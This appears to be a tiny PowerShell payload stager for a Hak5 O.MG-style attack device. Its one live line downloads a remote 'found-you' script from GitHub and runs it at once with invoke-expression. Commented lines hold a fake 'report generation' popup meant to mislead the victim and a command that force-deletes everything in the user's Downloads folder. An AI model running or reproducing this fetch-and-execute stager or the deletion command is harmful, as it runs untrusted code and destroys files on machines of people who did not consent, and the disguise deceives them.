#1
#$wshell = New-Object -ComObject Wscript.Shell
#$wshell.Popup("The report generation script is executed!d")
#Remove-Item -Path "$env:USERPROFILE\Downloads\*" -Recurse -Force
$pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-We-Found-You/found-you.ps1?dl=1; invoke-expression $pl
exit
